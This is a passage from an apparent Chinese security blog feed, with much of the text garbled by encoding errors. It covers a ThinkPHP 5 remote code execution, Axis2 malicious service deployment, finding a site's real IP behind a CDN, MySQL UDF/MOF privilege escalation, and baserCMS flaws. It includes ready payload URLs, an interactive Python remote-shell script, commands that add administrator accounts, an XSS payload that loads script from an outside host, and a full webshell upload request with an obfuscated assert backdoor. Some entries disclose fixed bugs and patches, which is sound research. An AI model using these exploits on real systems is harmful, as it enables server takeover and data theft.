æ‰§è¡Œæ¼æ´ç®€è¿°åˆ°ç°åœ¨è¿™ä¸ªç‚¹ç›¸ä¿¡å„å¤§å‚å•†éƒ½çš„waféƒ½å¯ä»¥æ‹¦æˆªè¿™ä¸ªæ”»å‡»äº†ï¼ŒåŒ…æ‹¬æˆ‘å¸23333ã€‚ä¹‹æ‰€ä»¥å­˜åœ¨æ¼æ´ï¼Œå…³é”®åœ¨äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œä»è¡¥ä¸ä¹Ÿèƒ½çœ‹å‡ºæ¥ã€‚è´´æ¼æ´äº§ç”Ÿçš„éƒ¨åˆ†å…³é”®ä»£ç ï¼šä»ä¸‹è¿°ä»£ç å¯çŸ¥ï¼Œåœ¨å½“$nameåŒ…å«\åˆ™å°†å…¶ä½œä¸ºç±»åï¼Œå¦‚æœ$nameå¯æ§ï¼Œæ˜¯å¯ä»¥å®ä¾‹åŒ–ä»»ä½•ä¸€ä¸ªç±»çš„ã€‚ 1234567protected function parseModuleAndClass($name, $layer, $appendSuffix) &#123; echo &apos;parseModuleAndClass:&apos;.$name.&quot;&lt;br&gt;&quot;; if (false !== strpos($name, &apos;\\&apos;)) &#123; $class = $name; $module = $this-&gt;request-&gt;module(); &#125; è€Œ$nameå¯æ§ä¸”\æ²¡è¢«è¿‡æ»¤ï¼Œå› æ­¤å¯ä»¥é€šè¿‡s=index/\think\Container/invokefunctionçš„æ–¹å¼è°ƒç”¨think\Containerè¿™ä¸ªå‘½åç©ºé—´ä¸‹çš„invokefunctionå‡½æ•°ã€‚ä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚ pocï¼š123456789?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1?s=index/\think\Request/input&amp;filter=system&amp;data=id?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami?s=index/think\config/get&amp;name=database.password æ£€æµ‹è„šæœ¬ï¼šé¿å…å…¶ä»–é—®é¢˜ï¼Œæš‚æ”¾ä¸€ä¸ªgithubä¸Šçš„ç®€å•æµ‹è¯•è„šæœ¬ï¼šattack.py12345678910111213141516171819202122#author: ctudoudoufrom requests import getfrom argparse import ArgumentParserif __name__ == &apos;__main__&apos;: parser = ArgumentParser(prog=&apos;Test poc&apos;, usage=&apos;./attack.py [options: -u] &lt;url&gt;&apos;, description=&quot;The ThinkPHP test script&quot;) parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, help=&quot;attack url&quot;) args = parser.parse_args() while (True): url = &apos;&#123;&#125;?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&apos; \ &apos;&amp;vars[0]=system&amp;vars[1][]=&apos;.format(args.url)#å¯ç»§ç»­æ·»åŠ å…¶ä»–poc command = input(&quot;shell$ &quot;) if command != &quot;exit&quot;: payload = url + str(command) r = get(payload) print(r.text) else: break è‡ªå·±ç®€å•å†™äº†ä¸€ä¸ªç»¼åˆæ£€æµ‹çš„è„šæœ¬ï¼šgithub: https://github.com/sunu11/thinkphpv5 ä¿®å¤å®˜æ–¹ç°å·²æ¨å‡ºè¡¥ä¸ å»ºè®®å¼€å‘è€…è¿›è¡Œä¿®å¤Thinkphp v5.0.xè¡¥ä¸åœ°å€: https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756fThinkphp v5.1.xè¡¥ä¸åœ°å€: https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815å¦å¤–åƒè¿™ç§æ¼æ´æ˜¯å­˜åœ¨æ”»å‡»ç‰¹å¾çš„ï¼ŒåŸºäºæ­£åˆ™çš„wafä¹Ÿå¯ä»¥è¿›è¡Œæ‹¦æˆªï¼Œå› æ­¤æœ‰è£…äº†wafçš„å‡çº§è§„åˆ™åº“å¯ä¿æ— ç¢ï¼Œæ²¡å®‰è£…çš„git pull å®˜æ–¹ä»£ç åº”è¯¥ä¹Ÿè¿˜okã€‚å…³é”®æ˜¯åŠæ—¶å‘ç°ï¼ŒåŠæ—¶å¤„ç†ã€‚ å…¶ä»–æ¼æ´1ã€phpmyadmin å®˜ç½‘ä¹Ÿæ›´æ–°äº†ï¼Œä¿®å¤äº†ä¸‰æšæ¼æ´ï¼Œæ–‡ä»¶åŒ…å«ã€csrfã€xssï¼Œå¯ä»¥åŠæ—¶å…³æ³¨ä¸€ä¸‹ã€‚https://www.t00ls.net/articles-48952.html2ã€å¶åƒOrange Tsaiå‘äº†ä¸€æ¡Twitterï¼š1After weeks of diving into a single 500mb idb file. Finally chained a pre-auth RCE in a popular SSL VPN! ğŸ™Œ é™å€™233333]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>getshell</tag>
        <tag>phpmyadmin</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å…¶ä»–åˆ†äº«çš„ä¸€äº›ä¸œè¥¿]]></title>
    <url>%2F2018%2F11%2F28%2Fohters%2F</url>
    <content type="text"><![CDATA[è®°å½•ä¸€ä¸‹ï¼Œæ–¹ä¾¿ä»¥åæŸ¥è¯¢ã€‚ ä»£ç å®¡è®¡ucms1.4.5åå°sqlæ³¨å…¥æ¼æ´ https://www.t00ls.net/thread-48432-1-1.htmlDedeCMS V5.7 SP2å‰å°æ–‡ä»¶ä¸Šä¼ (éœ€è¦åå°æƒé™CVE-2018-20129)å¤ç°åˆ†æ https://www.t00ls.net/thread-49086-1-1.html CTFH1 CTF Writeup(ç®€å•ç¿»è¯‘ï¼‰https://www.t00ls.net/thread-48659-1-1.htmlç½‘é¼æ¯éƒ¨åˆ†é¢˜writeup https://topsec.wiki/36t9aJda/?thread-495.htmEDU-CTF2018_Web:TwoFile https://www.t00ls.net/thread-49523-1-1.html]]></content>
      <categories>
        <category>other</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Axis2æ¶æ„éƒ¨ç½²getshell]]></title>
    <url>%2F2018%2F11%2F03%2FAxis2%E6%81%B6%E6%84%8F%E9%83%A8%E7%BD%B2getshell%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹ä»¥å‰é‡åˆ°çš„ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¾¿äºä»¥åæŸ¥é˜… è¿‡ç¨‹ä¸€èˆ¬é»˜è®¤çš„è´¦å·æ˜¯adminå¯†ç æ˜¯axis2ï¼Œç™»é™†åï¼šç‚¹å‡»upload serviceä¸Šä¼ cat.aaræ–‡ä»¶ï¼Œå¯çœ‹åˆ°ä¸Šä¼ æˆåŠŸã€‚ç‚¹å‡»Available Serviceså¯é€‰æ‹©å¯ç”¨çš„åŠŸèƒ½ã€‚ä¸»è¦åŠŸèƒ½æœ‰ï¼š1ã€getClassPath2ã€æ‰§è¡Œå‘½ä»¤ï¼šå‚æ•°:cmd=xxx3ã€åå¼¹shellï¼šhttps://192.168.86.254:8443/axis2/services/Cat/shell?host=x.x.x.x&amp;port=x4ã€å†™å…¥shellæˆ–æ˜¯å†™å…¥æ–‡ä»¶https://192.168.86.254:8443/axis2/services/Cat/writeStringToFile?data=æ•°æ®&amp;file=æ–‡ä»¶è·¯å¾„&amp;encoding=utf-8&amp;append=false è¯¦ç»†è¿‡ç¨‹è¯·å‚è€ƒï¼šhttp://p2j.cn/?p=1533]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>getshell</tag>
        <tag>axis2</tag>
        <tag>ä¸­é—´ä»¶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¦‚æœè·å–ç«™ç‚¹çœŸå®ip]]></title>
    <url>%2F2018%2F11%2F03%2F%E5%A6%82%E6%9E%9C%E8%8E%B7%E5%8F%96%E7%AB%99%E7%82%B9%E7%9C%9F%E5%AE%9Eip%2F</url>
    <content type="text"><![CDATA[ç®€ä»‹è¯´åˆ°æ¸—é€æµ‹è¯•ï¼Œè‚¯å®šæœ‰ä¿¡æ¯æ”¶é›†ï¼›ä¿¡æ¯æ”¶é›†å°±æ¶‰åŠæœåŠ¡å™¨ipä¿¡æ¯ã€‚è€Œé€šå¸¸å¤§å‹ç«™ç‚¹éƒ½é€šè¿‡äº†cdnã€ä»£ç†ç­‰æ‰‹æ®µéšè—ã€‚æœ¬æ–‡å¯¹è¿™ä¸ªè€è¯é¢˜ä½œä¸€ä¸‹ä¸ªäººçš„æ€è·¯ä»¥åŠå§¿åŠ¿æ€»ç»“ã€‚ å§¿åŠ¿1ã€å¯¹äºå­˜åœ¨æ³¨å†Œæˆ–è€…ç•™è¨€ç­‰èƒ½å¤Ÿè®©ç«™ç‚¹é€šè¿‡é‚®ä»¶è”ç³»çš„ç½‘ç«™ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡ç«™ç‚¹å‘é€çš„é‚®ä»¶æ‰¾åˆ°æœåŠ¡å™¨çš„çœŸå®ipï¼Œå¦‚bilibili.comï¼šæ­¤æ–¹æ³•æ˜¯å› ä¸ºé€šå¸¸å¤§éƒ¨åˆ†å…¬ç”¨SMTPæœåŠ¡åœ¨å‘ä¿¡æ—¶é‚®ä»¶å¤´ä¼šå¸¦ä¸Šå‘ä»¶è€…ipï¼Œcdnçš„é˜²æŠ¤å¯¹è¿™ç§æ–¹å¼å®Œå…¨æ²¡ä½œç”¨ã€‚è§£å†³æ–¹å¼å¯ä»¥å‚è€ƒæ­¤é“¾æ¥ï¼šhttps://www.v2ex.com/t/2767882ã€nslookupå‘½ä»¤ï¼šå¯¹äºbilibili.com è¯¥æ–¹å¼åŒæ ·å®ç”¨ï¼Œå› ä¸ºå­˜åœ¨MXè®°å½•ï¼šä¹Ÿå¯ä»¥æŸ¥æ‰¾NSã€TXTç­‰å…¶ä»–è®°å½•è¿›è¡ŒçœŸå®ipçš„æŸ¥æ‰¾ã€‚å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨å›½å¤–å†·é—¨çš„dnsè§£æåŸŸåï¼šnslookup xxx.com y.y.y.y å¦‚æœè¿æ°”å¥½ï¼Œæ‰¾åˆ°ç›´æ¥è§£æåˆ°æœåŠ¡å™¨çœŸå®ipçš„dnsæœåŠ¡å™¨ã€‚ä¸€æŸ¥å°±å‡ºæ¥äº†ã€‚3ã€Pingï¼šæ‰¾äºŒçº§åŸŸåï¼Œé€šè¿‡pingå°†ç½‘ç«™çš„äºŒçº§åŸŸåçš„ipé€ä¸ªä¸ç›®æ ‡åŸŸåç›¸åŒ¹é…ï¼Œç›´åˆ°è®¿é—®æˆåŠŸå³å¯ï¼Œè¿˜æœ‰pingç§ƒåŸŸå(å¦‚å¯¹äºwww.baidu.comï¼Œå¯¹äºping baidu.comå°±æ˜¯pingç§ƒåŸŸå)ï¼Œè¿™ç±»æ–¹å¼éƒ½æ˜¯çœ‹ç®¡ç†å‘˜ç²—ä¸ç²—å¿ƒï¼Œå¦‚æœèƒ½æ‰¾åˆ°ç®¡ç†å‘˜æ²¡æœ‰ä½¿ç”¨cdnçš„åŸŸåï¼Œå°±èƒ½æ‰¾åˆ°çœŸå®ipäº†ã€‚åŒæ ·å› ä¸ºå¾ˆå¤šå›½å†…çš„CDNæ²¡æœ‰èŠ‚ç‚¹å¯¹å›½å¤–æœåŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å›½å¤–çš„å¤šèŠ‚ç‚¹pingå·¥å…·ï¼Œä¾‹å¦‚just-pingï¼Œå…¨ä¸–ç•Œå‡ åä¸ªèŠ‚ç‚¹pingç›®æ ‡åŸŸåï¼Œå¾ˆæœ‰å¯èƒ½æ‰¾åˆ°çœŸå®ipã€‚åŸŸåï¼šhttps://asm.ca.com/en/ping.php4ã€é€šè¿‡ç½‘ç«™çš„ç¼ºé™·ä¸æ¼æ´,æ¯”å¦‚å¯»æ‰¾ç½‘ç«™ä¸Šçš„æ¢é’ˆï¼šphpinfoç­‰ï¼Œå¯»æ‰¾ç½‘ç«™ä¸Šçš„xssã€os injectionã€ssrfç­‰ä¸€åˆ‡å¯ä»¥è®©æœåŠ¡å™¨ä¸»åŠ¨è®¿é—®æˆ‘çš„vpsçš„æ¼æ´ï¼Œå¹¶æˆåŠŸåˆ©ç”¨ã€‚é€šè¿‡æŸ¥çœ‹æ—¥å¿—æˆ–è€…vpsçš„è¯·æ±‚è®°å½•å°±èƒ½çœ‹åˆ°çœŸå®ipã€‚5ã€é€šè¿‡å¤§é‡ä¿¡æ¯æ”¶é›†ï¼Œå¦‚é€šè¿‡å…¶ä»–ç¬¬ä¸‰æ–¹ç½‘ç«™æŸ¥çœ‹åŸŸåå†å²è§£æè®°å½•ã€åŸŸåå†å²ä¿¡æ¯å†å²æ¼æ´æˆ–è€…äºŒçº§åŸŸåç­‰ç„¶ååˆ©ç”¨è¿™äº›è·å–åˆ°çš„ä¿¡æ¯è¿›è¡Œè¿›ä¸€æ­¥çš„ipæŸ¥æ‰¾ï¼ˆçµæ´»ä½¿ç”¨ï¼‰ï¼Œè¿™ä¸‹é¢æ˜¯å¸¸ç”¨çš„å‡ ä¸ªï¼š 12345678https://bgp.he.net https://toolbar.netcraft.com/site_report?url=www.xxx.comhttp://www.17ce.comhttp://www.crimeflare.com/https://domainbigdata.com/goodmbi.comhttps://crt.sh/http://wooyun.jozxing.cc/https://fofa.so/ æœ€åçš„fofaæ˜¯ç½‘ä¸Šå­¦åˆ°çš„å§¿åŠ¿ä¹‹ä¸€ï¼Œé€šè¿‡fofaçš„HTMLæºä»£ç æ£€ç´¢ï¼Œå¤åˆ¶ç½‘é¡µtitleæˆ–è€…å…¶ä»–ä¿¡æ¯æ”¾fofaè¿›è¡Œæ£€ç´¢ï¼Œ5173.comå¯ä»¥é€šè¿‡è¯¥æ–¹æ³•æ‰¾åˆ°çœŸå®ipä½†æ˜¯å‰ä¸¤å¤©æˆ‘éœ€è¦æŸ¥æ‰¾æºipçš„ç½‘å€ä½¿ç”¨è¯¥æ–¹æ³•æ— æ•ˆï¼Œæ­¤æ–¹æ³•å»ºç«‹åœ¨é€šè¿‡fofaèƒ½æ£€ç´¢åˆ°å¹¶ä¸”htmlæ ‡è¯†å¤Ÿç‹¬ç‰¹çš„åŸºç¡€ä¸‹ï¼Œä¸ªäººæ„Ÿè§‰åœ¨æ²¡æœ‰æ€è·¯çš„æ—¶å€™ä¹Ÿå¯ä»¥è¯•è¯•ï¼Œæœ‰å¾…ä¸‹ä¸€æ¬¡å®è·µã€‚è´´ä¸€å¼ å›¾ï¼š6ã€å…¶ä»–æ²¡å°è¯•è¿‡çš„å§¿åŠ¿ï¼šç¤¾å·¥åˆ°cdnè´¦å·å¯†ç ï¼Œæ€¼è¿›å»çœ‹é…ç½®ï¼›zmapæ‰«å…¨ç½‘ï¼ŒåŒ¹é…ç«™ç‚¹ä¿¡æ¯è¿½æº¯çœŸå®ipï¼›DDOSï¼ŒæŠŠcdnæ‰“ç©¿å°±ä¼šå›æºï¼›é€šè¿‡DNSç¤¾å·¥åº“ï¼Œæ‰¾å¯¹åº”çš„è§£æè®°å½•ã€‚]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>ä¿¡æ¯æ”¶é›†</tag>
        <tag>fofa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysqlä¸¤ç§ç»å…¸ææƒæ–¹å¼]]></title>
    <url>%2F2018%2F11%2F03%2F%E7%BB%8F%E5%85%B8%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[udfææƒæ¡ä»¶ï¼š1ã€ç³»ç»Ÿç‰ˆæœ¬ï¼ˆWindows2000ï¼ŒXP,Win2003);2ã€æ‹¥æœ‰MYSQLçš„æŸä¸ªè´¦å·ï¼Œä¸”è¯¥è´¦å·å…·æœ‰å¯¹msqlçš„insertä¸deleteæƒé™ã€‚3ã€å…·æœ‰rootè´¦å·å¯†ç é¦–å…ˆå¯¼å‡ºudfï¼šMYSQL5.1ä»¥ä¸Šç‰ˆæœ¬ï¼Œéœ€è¦æŠŠudf.dllæ–‡ä»¶å­˜æ”¾åˆ°MSYSQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹ã€‚åœ¨mysqlå‘½ä»¤è¡Œè¾“å…¥ï¼š@@basedir1show variables like &apos;%plugins%&apos; ç„¶åææƒï¼š12345create function cmdshell returns string soname &apos;udf.dll&apos;select cmdshell(&apos;net user xxx xxx /add&apos;);select cmdshell (&apos;net localgroup administrators xxx /add&apos;);drop function cmdshell; **returns string soname â€˜å¯¼å‡ºçš„DLLè·¯å¾„â€™ mofææƒä»¥ä¸‹ä¸ºåˆ›å»ºxxxç”¨æˆ·çš„mofæ–‡ä»¶ï¼Œä½¿ç”¨sqlæ‰§è¡Œload_fileåŠinto dumpfile æŠŠæ–‡ä»¶å¯¼å‡ºåˆ°æ­£ç¡®ä½ç½®ï¼Œæ‰§è¡Œå³å¯ã€‚12345678910111213141516171819202122232425#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) instance of __EventFilter as $EventFilter&#123; EventNamespace = &quot;Root\\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;;&#125;; instance of ActiveScriptEventConsumer as $Consumer&#123; Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user xxx xxx /add\&quot;)&quot;;&#125;; instance of __FilterToConsumerBinding&#123; Consumer = $Consumer; Filter = $EventFilter;&#125;; æ‰§è¡Œsqlå‘½ä»¤ï¼šselect load file(&#39;c:/wmpub/nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;; åœ¨å¯æ§æ•°æ®åº“çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ç›´æ¥å†™å…¥ï¼šselect char(å°†ä¸Šè¿°exp ascç¼–ç å†™å…¥) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mov&#39;; ä»¥ä¸Šå‡ä¸ºæ–°å»ºè´¦å·ï¼Œè¿˜éœ€è¦ä¿®æ”¹ä»£ç å°†xxxç”¨æˆ·åŠ å…¥administratorsï¼Œé‡æ–°å†™å…¥ä¸€éå³å¯ã€‚]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[baserCMS æ¼æ´æŠ«æ¼]]></title>
    <url>%2F2018%2F10%2F31%2FbaserCMS%2F</url>
    <content type="text"><![CDATA[DescriptionbaserCMSï¼ˆãƒ™ãƒ¼ã‚µãƒ¼ã‚·ãƒ¼ã‚¨ãƒ ã‚¨ã‚¹ï¼‰ã¨ã¯ã€ç›´æ„Ÿçš„ãªæ“ä½œã¨é«˜ã„ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹æ€§ã‚’å®Ÿç¾ã—ã€Webã‚µã‚¤ãƒˆã‚’è‡ªç”±ã«ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã§ãã‚‹å›½ç”£CMSï¼ˆã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãƒ»ãƒãƒãƒ¼ã‚¸ãƒ¡ãƒ³ãƒˆãƒ»ã‚·ã‚¹ãƒ†ãƒ ï¼‰ã§ã™ã€‚æ—¥æœ¬äººãŒæ—¥æœ¬äººã®ç‚ºã«ã€ã¿ã‚“ãªã§ä½œã£ã¦ã„ã‚‹ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ»ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã§ã™ã€‚ç„¡æ–™ã§åˆ©ç”¨ã§ãã€æ§˜ã€…ãªã‚µãƒ¼ãƒãƒ¼ã§å‹•ä½œå¯èƒ½ã§ã€ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã‚‚ç°¡å˜ã§ã™ã€‚ ã‚ªãƒ¼ãƒ—ãƒ³ã‚½ãƒ¼ã‚¹ãƒ»ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã€ŒCakePHPã€ã‚’ãƒ™ãƒ¼ã‚¹ã¨ã—ã¦ã„ã‚‹ã®ã§ã€ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºæ€§ã€ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹æ€§ãŒé«˜ã„ã®ãŒç‰¹å¾´ã§ã™ã€‚ ãƒ„ãƒªãƒ¼æ§‹é€ ã«ã‚ˆã‚Šå›ºå®šãƒšãƒ¼ã‚¸ã€ãƒ–ãƒ­ã‚°ã€ãƒ•ã‚©ãƒ¼ãƒ ã‚’ã¾ã¨ã‚ã¦ç®¡ç†ã§ãã‚‹ã€å¼·åŠ›ãªã‚³ãƒ³ãƒ†ãƒ³ãƒ„ç®¡ç†æ©Ÿèƒ½ã‚’æŒã¤CMSã§ã™ã€‚Webã‚µã‚¤ãƒˆã«æœ€ä½é™å¿…è¦ã¨ãªã‚‹ãƒ¡ãƒ¼ãƒ«ãƒ•ã‚©ãƒ¼ãƒ ã‚„æ–°ç€ãƒ–ãƒ­ã‚°ãªã©ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚„ç®¡ç†ç”»é¢ã®æ çµ„ã¿ã‚’æœ€åˆã‹ã‚‰è£…å‚™ã—ã¦ãŠã‚Šã€ã‚¹ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ³ã«ã‚‚æ¨™æº–å¯¾å¿œã—ã¦ã„ã¾ã™ã€‚ ãƒãƒ‹ãƒ¥ã‚¢ãƒ«ã‚„ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã®ã‚³ãƒ¡ãƒ³ãƒˆã«ãŠã„ã¦æ—¥æœ¬èªã‚’æ¨™æº–ã¨ã—ã¦ã„ã‚‹ã®ã‚‚å›½ç”£CMSã®å¼·ã¿ã§ã™ã€‚ â€”â€”â€”â€” itâ€™s copy from https://basercms.net/about/index.html I found two vulnerability in basicCMS 4.1.3. storage xss vulnerabilityï¼ˆfixedï¼‰There is a storage xss vulnerability in the category name editor after login with normal administrator privileges. ExampleWe register two administrator accounts with different permissionsï¼šã‚·ã‚¹ãƒ†ãƒ ç®¡ç† and ã‚µã‚¤ãƒˆé‹å–¶Log in to the system using ã‚µã‚¤ãƒˆé‹å–¶ privileged account root:In the Register New Category feature of the Upload menu, the category name can execute a malicious xss statement:After the administrator logs in, accessing the page triggers:Soï¼ŒWe can insert malicious javascript according to the vulnerability to override the administrator function.For exampleThe root user does not have permission to accessâ€œhttp://127.0.0.1/basercms/admin/site_configs/del_cacheâ€ to delete the server cache information:We can exploit this vulnerability to implement an attack:Since the data[UploaderCategory][name] parameter has a length limit, We can insert the following statement first:&lt;script src=&quot;http://vps_ip/1.js&quot;&gt;&lt;/script&gt;Then, 1.js uses ajax to write a get request tohttp://127.0.0.1/basercms/admin/site_configs/del_cache:Verify: The root (asda)user refreshes the page:And when the administrator user(ad_lab) accesses the page, it triggers js and deletes the server cache.Finally, I found the corresponding code with defects.UploaderCategoriesController.phpIt was found that the ã‚«ãƒ†ã‚´ãƒªåï¼ˆdata[UploaderCategory][name]ï¼‰parameter submitted by the user did not filter the malicious characters, Solution:Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. Announcement address Code Execution Vulnerabilityï¼ˆfixedï¼‰ProcessDownload the latest version of basercms (4.1.3).In \basercms\lib\Baser\Model\ThemeConfig.php, you can see that the uploaded file suffix is not checked, so we can upload the webshell file directly. In the saveImage method of \basercms\lib\Baser\Model\ThemeConfig.php we can see that is about saving the logo during the theme setup:We can seen move_uploaded_file methodï¼ŒThen audit codeï¼ŒIt can be seen that the image is saved here and the suffix is not verified.ï¼ŒOnly limited the image name (logo)ï¼ŒSo you can get server permissions by uploading php webshell.Pocï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051POST /basercms/admin/theme_configs/form HTTP/1.1Host: 127.0.0.1Content-Length: 3986Cache-Control: max-age=0Origin: http://127.0.0.1Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfOCEZtinjMBherH4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://127.0.0.1/basercms/admin/theme_configs/formAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: BASERCMS=vfshte61c73tufbvit1j63amv2Connection: close------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;_method&quot;POST------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[_Token][key]&quot;65d6c82611c9eb9840aef42c97d82c36847093f574cbe4c2cb7964537a3d594b19d92b9c116bd3595e0f14ba510a880e1a2573033f81a71dd25800d09917183a------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_main]&quot;e371e3------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_sub]&quot;21b537------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_link]&quot;1808f5------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_hover]&quot;ed8815------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo]&quot;; filename=&quot;x.php&quot;Content-Type: application/octet-stream&lt;?php $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_GET[cc]); ?&gt;------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_alt]&quot;baserCMS------WebKitFormBoundaryfOCEZtinjMBherH4Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_link]&quot;... Then according to the code description, you can get the webshell path:http://127.0.0.1/basercms/files/theme_configs/logo.phpCommand execution: Solution:Whitelist restrictions on upload file suffixes such as (jpg, png, gif, jpeg etc.)Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. Announcement address Vulnerability information page:https://basercms.net/security/CVE-2018-18942_CVE-2018-18943]]></content>
      <categories>
        <category>WEBå®‰å…¨</category>
      </categories>
      <tags>
        <tag>æ¼æ´æŠ«æ¼</tag>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>baserCMS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[glxcmsæ¼æ´æŠ«æ¼]]></title>
    <url>%2F2018%2F10%2F18%2Fglxcms%2F</url>
    <content type="text"><![CDATA[cmsç®€ä»‹Gxlcmsæ–°é—»ç³»ç»Ÿæ˜¯ä¸€ä¸ªä»¥php+mysqlè¿›è¡Œå¼€å‘çš„æ–°é—»ç±»cmså†…å®¹ç®¡ç†ç³»ç»Ÿã€‚Gxlcmsæ–°é—»ç³»ç»Ÿçš„ä¼˜åŠ¿ï¼šå‰å°ä¸åå°é‡‡ç”¨éš”ç¦»æ–¹å¼ï¼Œæ¨¡æ¿åŒ–è®¾è®¡ï¼Œè®©åªè¦ä½ ä¼šå‰ç«¯å°±å¯ä»¥åšä¸€ä¸ªæ–°é—»ç½‘ç«™ï¼åå°è®¾è®¡ç®€å•æ˜äº†ï¼Œå°ç™½ç”¨æˆ·ä¸€çœ‹å°±ä¼šæ˜ç™½ï¼ç¨‹åºåŠŸèƒ½ä¹Ÿéå¸¸å®Œå–„ï¼1.ç›®å‰ç¨‹åºæ”¯æŒä¸‰ç§è·¯ç”±æ¨¡å¼ï¼šé™æ€ç”Ÿæˆï¼Œä¼ªé™æ€ï¼ŒåŠ¨æ€ï¼›2.æ”¯æŒä¸¤ç§å­˜å‚¨æ¨¡å¼ï¼šæœ¬åœ°å­˜å‚¨ï¼ŒFTPå­˜å‚¨3.æ¥å…¥ç™¾åº¦ä¸»åŠ¨æ¨é€åŠŸèƒ½ï¼è®©ä½ æ¯ç¯‡æ–°é—»/èµ„è®¯éƒ½å¯ä»¥åŠæ—¶è¢«ç™¾åº¦å‘ç°4.å›¾ç‰‡æ°´å°åŠŸèƒ½ï¼šåªè¦å¼€å¯å›¾ç‰‡æ°´å°ï¼Œä¸ç®¡æ˜¯æ ‡å›¾å›¾ç‰‡æˆ–è€…æ˜¯å†…å®¹å›¾ç‰‡ç»Ÿç»Ÿæ·»åŠ æ°´å°ï¼Œæ°´å°åŠŸèƒ½æ”¯æŒ9å®«æ 